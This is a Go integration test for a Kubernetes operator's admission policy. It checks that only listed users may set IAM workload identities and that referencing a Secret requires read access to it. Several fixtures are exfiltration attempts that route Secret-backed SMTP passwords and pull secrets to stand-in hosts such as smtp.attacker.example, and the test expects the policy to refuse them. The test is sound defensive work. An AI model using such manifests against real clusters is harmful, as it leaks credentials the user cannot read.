// Copyright 2026 The pgToolBox Authors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package admissionpolicy

import (
	"bytes"
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	admissionregistrationv1 "k8s.io/api/admissionregistration/v1"
	rbacv1 "k8s.io/api/rbac/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	clientgoscheme "k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/envtest"
	"sigs.k8s.io/yaml"

	pgtoolboxv1alpha1 "github.com/fyannk/pgToolBox/api/v1alpha1"
)

const (
	// Everybody below is in this group, which RBAC lets manage EvidenceAgents
	// and PgAdmins: the admission policy, not RBAC, is what is under test.
	teamGroup     = "team-members"
	platformGroup = "platform-team"
	namespace     = "default"
)

// renderPolicy runs helm template on the operator chart with the admission
// policy on and returns its ValidatingAdmissionPolicy and binding. The
// allow-lists are overridden so that the test's users, not system:masters,
// are the ones listed.
func renderPolicy(t *testing.T) (*admissionregistrationv1.ValidatingAdmissionPolicy, *admissionregistrationv1.ValidatingAdmissionPolicyBinding) {
	t.Helper()
	if _, err := exec.LookPath("helm"); err != nil {
		t.Skip("helm is not installed")
	}
	chart := filepath.Join("..", "..", "..", "charts", "pgtoolbox")
	out, err := exec.CommandContext(t.Context(), "helm", "template", "pgtoolbox", chart, "--namespace", "pgtoolbox", // #nosec G204 -- fixed arguments
		"--set", "operator.enabled=true",
		"--set", "operator.admissionPolicy.enabled=true",
		"--set", "operator.admissionPolicy.workloadIdentity.allowedUsers={alice}",
		"--set", "operator.admissionPolicy.workloadIdentity.allowedGroups={"+platformGroup+"}",
	).CombinedOutput()
	if err != nil {
		t.Fatalf("helm template: %v\n%s", err, out)
	}
	var policy *admissionregistrationv1.ValidatingAdmissionPolicy
	var binding *admissionregistrationv1.ValidatingAdmissionPolicyBinding
	for _, doc := range bytes.Split(out, []byte("\n---")) {
		kind := struct {
			Kind string `json:"kind"`
		}{}
		if yaml.Unmarshal(doc, &kind) != nil {
			continue
		}
		switch kind.Kind {
		case "ValidatingAdmissionPolicy":
			policy = &admissionregistrationv1.ValidatingAdmissionPolicy{}
			if err := yaml.UnmarshalStrict(doc, policy); err != nil {
				t.Fatalf("policy: %v", err)
			}
		case "ValidatingAdmissionPolicyBinding":
			binding = &admissionregistrationv1.ValidatingAdmissionPolicyBinding{}
			if err := yaml.UnmarshalStrict(doc, binding); err != nil {
				t.Fatalf("binding: %v", err)
			}
		}
	}
	if policy == nil || binding == nil {
		t.Fatalf("the chart rendered no admission policy (%v) or binding (%v)", policy != nil, binding != nil)
	}
	return policy, binding
}

func evidenceAgent(name string) *pgtoolboxv1alpha1.EvidenceAgent {
	return &pgtoolboxv1alpha1.EvidenceAgent{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: namespace},
		Spec:       pgtoolboxv1alpha1.EvidenceAgentSpec{ClusterRef: pgtoolboxv1alpha1.LocalObjectReference{Name: "orders"}},
	}
}

func identity(role string) *pgtoolboxv1alpha1.WorkloadIdentitySpec {
	return &pgtoolboxv1alpha1.WorkloadIdentitySpec{ServiceAccountAnnotations: map[string]string{
		"eks.amazonaws.com/role-arn": "arn:aws:iam::123456789012:role/" + role,
	}}
}

// TestEnvtestWorkloadIdentityAdmission evaluates the rendered policy on an
// API server (1.30+ for admissionregistration.k8s.io/v1 policies; make
// test-envtest-admissionpolicy): only the listed users and groups may set or
// change spec.workloadIdentity, anybody may leave it alone.
func TestEnvtestWorkloadIdentityAdmission(t *testing.T) {
	if os.Getenv("KUBEBUILDER_ASSETS") == "" {
		t.Skip("KUBEBUILDER_ASSETS is not set (make test-envtest-admissionpolicy)")
	}
	policy, binding := renderPolicy(t)

	env := &envtest.Environment{
		CRDDirectoryPaths:     []string{filepath.Join("..", "..", "..", "config", "crd", "bases")},
		ErrorIfCRDPathMissing: true,
	}
	admin, err := env.Start()
	if err != nil {
		t.Fatalf("start envtest: %v", err)
	}
	t.Cleanup(func() { _ = env.Stop() })

	scheme := runtime.NewScheme()
	for _, add := range []func(*runtime.Scheme) error{clientgoscheme.AddToScheme, pgtoolboxv1alpha1.AddToScheme} {
		if err := add(scheme); err != nil {
			t.Fatal(err)
		}
	}
	as := func(user string, groups ...string) client.Client {
		config := rest.CopyConfig(admin)
		config.Impersonate = rest.ImpersonationConfig{UserName: user, Groups: append([]string{teamGroup}, groups...)}
		c, err := client.New(config, client.Options{Scheme: scheme})
		if err != nil {
			t.Fatal(err)
		}
		return c
	}
	root, err := client.New(admin, client.Options{Scheme: scheme})
	if err != nil {
		t.Fatal(err)
	}

	// RBAC lets the whole team write the two kinds; the policy is the only
	// thing between them and spec.workloadIdentity.
	for _, object := range []client.Object{
		&rbacv1.ClusterRole{
			ObjectMeta: metav1.ObjectMeta{Name: "team-writes"},
			Rules: []rbacv1.PolicyRule{{
				APIGroups: []string{pgtoolboxv1alpha1.GroupVersion.Group}, Resources: []string{"evidenceagents", "pgadmins", "pgtoolboxconsoles"},
				Verbs: []string{"get", "list", "create", "update", "patch", "delete"},
			}},
		},
		&rbacv1.ClusterRoleBinding{
			ObjectMeta: metav1.ObjectMeta{Name: "team-writes"},
			RoleRef:    rbacv1.RoleRef{APIGroup: rbacv1.GroupName, Kind: "ClusterRole", Name: "team-writes"},
			Subjects:   []rbacv1.Subject{{Kind: rbacv1.GroupKind, APIGroup: rbacv1.GroupName, Name: teamGroup}},
		},
		// reader may read the Secret "readable" and nothing else.
		&rbacv1.Role{
			ObjectMeta: metav1.ObjectMeta{Name: "read-readable", Namespace: namespace},
			Rules: []rbacv1.PolicyRule{{
				APIGroups: []string{""}, Resources: []string{"secrets"}, ResourceNames: []string{"readable"}, Verbs: []string{"get"},
			}},
		},
		&rbacv1.RoleBinding{
			ObjectMeta: metav1.ObjectMeta{Name: "read-readable", Namespace: namespace},
			RoleRef:    rbacv1.RoleRef{APIGroup: rbacv1.GroupName, Kind: "Role", Name: "read-readable"},
			Subjects:   []rbacv1.Subject{{Kind: rbacv1.UserKind, APIGroup: rbacv1.GroupName, Name: "reader"}},
		},
		policy, binding,
	} {
		if err := root.Create(t.Context(), object); err != nil {
			t.Fatalf("create %T: %v", object, err)
		}
	}
	// The policy takes effect once the API server has compiled it and its
	// binding: wait until a stranger is refused, so no case below races it.
	probe := evidenceAgent("probe")
	probe.Spec.WorkloadIdentity = identity("probe")
	deadline := time.Now().Add(time.Minute)
	for {
		err := as("mallory").Create(t.Context(), probe)
		if apierrors.IsForbidden(err) && strings.Contains(err.Error(), "spec.workloadIdentity") {
			break
		}
		if err == nil {
			_ = root.Delete(t.Context(), probe)
			probe = evidenceAgent("probe")
			probe.Spec.WorkloadIdentity = identity("probe")
		}
		if time.Now().After(deadline) {
			t.Fatalf("the admission policy never took effect; last create error: %v", err)
		}
		time.Sleep(500 * time.Millisecond)
	}

	denied := func(t *testing.T, err error) {
		t.Helper()
		if !apierrors.IsForbidden(err) || !strings.Contains(err.Error(), "spec.workloadIdentity may be set only by") {
			t.Fatalf("error = %v, want a Forbidden naming spec.workloadIdentity", err)
		}
	}
	allowed := func(t *testing.T, err error) {
		t.Helper()
		if err != nil {
			t.Fatalf("error = %v, want the request admitted", err)
		}
	}
	create := func(t *testing.T, c client.Client, a *pgtoolboxv1alpha1.EvidenceAgent) error {
		t.Helper()
		t.Cleanup(func() { _ = root.Delete(context.Background(), a) })
		return c.Create(t.Context(), a)
	}
	// seeded creates an agent as alice, who is listed, with a workload identity.
	seeded := func(t *testing.T, name string) *pgtoolboxv1alpha1.EvidenceAgent {
		t.Helper()
		a := evidenceAgent(name)
		a.Spec.WorkloadIdentity = identity("seed")
		allowed(t, create(t, as("alice"), a))
		return a
	}

	t.Run("a user outside the lists cannot create an agent with a workload identity", func(t *testing.T) {
		a := evidenceAgent("stranger-create")
		a.Spec.WorkloadIdentity = identity("r")
		denied(t, create(t, as("mallory"), a))
	})
	t.Run("an empty workload identity is the opt-in and is refused too", func(t *testing.T) {
		a := evidenceAgent("stranger-empty")
		a.Spec.WorkloadIdentity = &pgtoolboxv1alpha1.WorkloadIdentitySpec{}
		denied(t, create(t, as("mallory"), a))
	})
	t.Run("a user outside the lists can create an agent without one", func(t *testing.T) {
		allowed(t, create(t, as("mallory"), evidenceAgent("stranger-plain")))
	})
	t.Run("a user outside the lists cannot add a workload identity", func(t *testing.T) {
		a := evidenceAgent("stranger-add")
		mallory := as("mallory")
		allowed(t, create(t, mallory, a))
		a.Spec.WorkloadIdentity = identity("r")
		denied(t, mallory.Update(t.Context(), a))
	})
	t.Run("a user outside the lists cannot change a workload identity", func(t *testing.T) {
		a := seeded(t, "stranger-change")
		mallory := as("mallory")
		if err := mallory.Get(t.Context(), client.ObjectKeyFromObject(a), a); err != nil {
			t.Fatal(err)
		}
		a.Spec.WorkloadIdentity = identity("other")
		denied(t, mallory.Update(t.Context(), a))
	})
	t.Run("a user outside the lists can change other fields and leave the identity as it is", func(t *testing.T) {
		a := seeded(t, "stranger-other")
		mallory := as("mallory")
		if err := mallory.Get(t.Context(), client.ObjectKeyFromObject(a), a); err != nil {
			t.Fatal(err)
		}
		a.Spec.RefreshInterval = &metav1.Duration{Duration: time.Minute}
		allowed(t, mallory.Update(t.Context(), a))
		if a.Spec.WorkloadIdentity == nil || a.Spec.WorkloadIdentity.ServiceAccountAnnotations["eks.amazonaws.com/role-arn"] != "arn:aws:iam::123456789012:role/seed" {
			t.Fatalf("the identity changed: %+v", a.Spec.WorkloadIdentity)
		}
	})
	t.Run("a listed user can create, add and change a workload identity", func(t *testing.T) {
		alice := as("alice")
		a := evidenceAgent("alice-lifecycle")
		allowed(t, create(t, alice, a))
		a.Spec.WorkloadIdentity = identity("one")
		allowed(t, alice.Update(t.Context(), a))
		a.Spec.WorkloadIdentity = identity("two")
		allowed(t, alice.Update(t.Context(), a))
	})
	t.Run("a member of a listed group can set and change it", func(t *testing.T) {
		carol := as("carol", platformGroup)
		a := evidenceAgent("platform-lifecycle")
		a.Spec.WorkloadIdentity = identity("one")
		allowed(t, create(t, carol, a))
		a.Spec.WorkloadIdentity = identity("two")
		allowed(t, carol.Update(t.Context(), a))
	})
	t.Run("a group that is not listed does not help a user whose name is not listed", func(t *testing.T) {
		a := evidenceAgent("other-group")
		a.Spec.WorkloadIdentity = identity("r")
		denied(t, create(t, as("dave", "another-team"), a))
	})
	t.Run("the rule does not apply to a PgAdmin, which has no workload identity", func(t *testing.T) {
		pgadmin := &unstructured.Unstructured{}
		if err := yaml.Unmarshal([]byte(`
apiVersion: pgtoolbox.fyannk.dev/v1alpha1
kind: PgAdmin
metadata: {name: team-a, namespace: default}
spec:
  clusterRefs: [{name: orders}]
  auth:
    oauth2:
      issuerURL: https://idp.example.com/realms/corp
      clientID: pgadmin
      clientSecretRef: {name: readable}
      requiredClaims: {groups: [dba]}
`), &pgadmin.Object); err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { _ = root.Delete(context.Background(), pgadmin) })
		// reader may read the Secret it names; the rule at hand is not the Secret one.
		allowed(t, as("reader").Create(t.Context(), pgadmin))
	})

	t.Run("secret references", func(t *testing.T) { testSecretRefs(t, root, as) })
}

// refused is a Forbidden that names the Secret rule.
func refused(t *testing.T, err error) {
	t.Helper()
	if !apierrors.IsForbidden(err) || !strings.Contains(err.Error(), "requires get on every Secret") {
		t.Fatalf("error = %v, want a Forbidden naming the Secret rule", err)
	}
}

func object(t *testing.T, manifest string) *unstructured.Unstructured {
	t.Helper()
	u := &unstructured.Unstructured{}
	if err := yaml.Unmarshal([]byte(manifest), &u.Object); err != nil {
		t.Fatal(err)
	}
	return u
}

// consoleWith returns a PgToolBoxConsole whose spec is the YAML fragment.
func consoleWith(t *testing.T, name, spec string) *unstructured.Unstructured {
	t.Helper()
	return object(t, "apiVersion: pgtoolbox.fyannk.dev/v1alpha1\nkind: PgToolBoxConsole\nmetadata: {name: "+name+", namespace: default}\nspec:\n"+spec)
}

func pgadminWith(t *testing.T, name, auth, extra string) *unstructured.Unstructured {
	t.Helper()
	return object(t, `apiVersion: pgtoolbox.fyannk.dev/v1alpha1
kind: PgAdmin
metadata: {name: `+name+`, namespace: default}
spec:
  clusterRefs: [{name: orders}]
  auth:
`+auth+extra)
}

const pgadminOAuth = `    oauth2:
      issuerURL: https://idp.example.com/realms/corp
      clientID: pgadmin
      clientSecretRef: {name: %s}
      requiredClaims: {groups: [dba]}
`

// testSecretRefs: editing a PgToolBoxConsole or a PgAdmin requires get on every
// Secret it names. mallory has no read access to any
// Secret, reader may read "readable" only, alice (workload identity list) is
// a plain team member here and reads nothing either.
func testSecretRefs(t *testing.T, root client.Client, as func(string, ...string) client.Client) {
	create := func(t *testing.T, c client.Client, u *unstructured.Unstructured) error {
		t.Helper()
		t.Cleanup(func() { _ = root.Delete(context.Background(), u) })
		return c.Create(t.Context(), u)
	}
	prom := func(secret string) string {
		return "  prometheus:\n    url: https://prometheus.example.com\n    tokenSecretRef: {name: " + secret + ", key: token}\n"
	}
	digest := func(delivery string) string {
		return "  history: {persistent: true}\n  digest:\n    enabled: true\n    delivery:\n" + delivery
	}

	t.Run("a user without get on a Secret cannot create a PgToolBoxConsole referencing it", func(t *testing.T) {
		refused(t, create(t, as("mallory"), consoleWith(t, "c-prom", prom("readable"))))
	})
	t.Run("a user with get on that Secret can", func(t *testing.T) {
		if err := create(t, as("reader"), consoleWith(t, "c-prom-ok", prom("readable"))); err != nil {
			t.Fatalf("error = %v, want admitted", err)
		}
	})
	t.Run("get on another Secret does not help", func(t *testing.T) {
		refused(t, create(t, as("reader"), consoleWith(t, "c-prom-other", prom("unreadable"))))
	})
	t.Run("a PgToolBoxConsole referencing no Secret is admitted to anybody", func(t *testing.T) {
		if err := create(t, as("mallory"), consoleWith(t, "c-plain", "  replicas: 2\n")); err != nil {
			t.Fatalf("error = %v, want admitted", err)
		}
	})
	// Every Secret-bearing field of the PgToolBoxConsole, each with a Secret nobody
	// may read: the exfiltration the rule exists for.
	for name, spec := range map[string]string{
		"digest.delivery.smtp.passwordSecretRef": digest("      smtp:\n        address: smtp.attacker.example:587\n        from: a@example.com\n        to: [a@example.com]\n        username: u\n        passwordSecretRef: {name: unreadable, key: password}\n"),
		"digest.delivery.chatWebhookSecretRef":   digest("      chatWebhookSecretRef: {name: unreadable, key: url}\n"),
		"digest.delivery.webhookSecretRef":       digest("      webhookSecretRef: {name: unreadable, key: url}\n"),
		"auth.oidc.clientSecretRef":              "  auth:\n    provider: oidc\n    oidc:\n      issuerURL: https://idp.example.com\n      clientID: c\n      clientSecretRef: {name: unreadable}\n",
		"auth.openshift.clientSecretRef":         "  publicURL: https://c.example.com\n  auth:\n    provider: openshift\n    openshift:\n      clientSecretRef: {name: unreadable, key: token}\n",
		"exposure.tls.certificateSecretRef":      "  exposure:\n    type: ingress\n    hostname: c.example.com\n    tls: {certificateSecretRef: {name: unreadable}}\n",
		"image.pullSecrets":                      "  image:\n    repository: registry.attacker.example/console\n    tag: v1\n    pullSecrets: [{name: unreadable}]\n",
	} {
		t.Run("PgToolBoxConsole "+name, func(t *testing.T) {
			refused(t, create(t, as("mallory"), consoleWith(t, "c-"+strings.ReplaceAll(strings.ToLower(name), ".", "-"), spec)))
		})
	}

	t.Run("a PgAdmin client Secret needs get too", func(t *testing.T) {
		refused(t, create(t, as("mallory"), pgadminWith(t, "a-denied", strings.Replace(pgadminOAuth, "%s", "unreadable", 1), "")))
		if err := create(t, as("reader"), pgadminWith(t, "a-ok", strings.Replace(pgadminOAuth, "%s", "readable", 1), "")); err != nil {
			t.Fatalf("error = %v, want admitted", err)
		}
	})
	t.Run("a PgAdmin pull Secret and TLS Secret need get", func(t *testing.T) {
		refused(t, create(t, as("mallory"), pgadminWith(t, "a-pull", "    openshiftOAuthProxy: {image: {repository: x.example/proxy, tag: v1, pullSecrets: [{name: unreadable}]}}\n", "")))
		refused(t, create(t, as("mallory"), pgadminWith(t, "a-tls", strings.Replace(pgadminOAuth, "%s", "readable", 1), "  exposure: {type: ingress, hostname: a.example.com, tls: {certificateSecretRef: {name: unreadable}}}\n")))
	})

	t.Run("on update only new or changed references are checked", func(t *testing.T) {
		// Seeded by the cluster admin: an object that predates the policy, or
		// created by somebody who could read the Secret.
		c := consoleWith(t, "c-update", prom("unreadable"))
		if err := create(t, root, c); err != nil {
			t.Fatal(err)
		}
		mallory := as("mallory")
		if err := mallory.Get(t.Context(), client.ObjectKeyFromObject(c), c); err != nil {
			t.Fatal(err)
		}
		// An unrelated edit (what the operator's finalizer write is) passes.
		if err := unstructured.SetNestedField(c.Object, int64(3), "spec", "replicas"); err != nil {
			t.Fatal(err)
		}
		if err := mallory.Update(t.Context(), c); err != nil {
			t.Fatalf("an edit that leaves the reference alone: %v", err)
		}
		// Pointing it at another unreadable Secret does not.
		if err := unstructured.SetNestedField(c.Object, "other-unreadable", "spec", "prometheus", "tokenSecretRef", "name"); err != nil {
			t.Fatal(err)
		}
		refused(t, mallory.Update(t.Context(), c))
		// Adding a second one at another field does not either.
		if err := root.Get(t.Context(), client.ObjectKeyFromObject(c), c); err != nil {
			t.Fatal(err)
		}
		if err := unstructured.SetNestedField(c.Object, map[string]any{"name": "unreadable", "key": "k"}, "spec", "digest", "delivery", "webhookSecretRef"); err != nil {
			t.Fatal(err)
		}
		if err := unstructured.SetNestedField(c.Object, map[string]any{"persistent": true}, "spec", "history"); err != nil {
			t.Fatal(err)
		}
		if err := unstructured.SetNestedField(c.Object, true, "spec", "digest", "enabled"); err != nil {
			t.Fatal(err)
		}
		refused(t, mallory.Update(t.Context(), c))
	})
	t.Run("a user with get can point a reference at that Secret", func(t *testing.T) {
		c := consoleWith(t, "c-repoint", prom("unreadable"))
		if err := create(t, root, c); err != nil {
			t.Fatal(err)
		}
		reader := as("reader")
		if err := reader.Get(t.Context(), client.ObjectKeyFromObject(c), c); err != nil {
			t.Fatal(err)
		}
		if err := unstructured.SetNestedField(c.Object, "readable", "spec", "prometheus", "tokenSecretRef", "name"); err != nil {
			t.Fatal(err)
		}
		if err := reader.Update(t.Context(), c); err != nil {
			t.Fatalf("error = %v, want admitted", err)
		}
	})
}
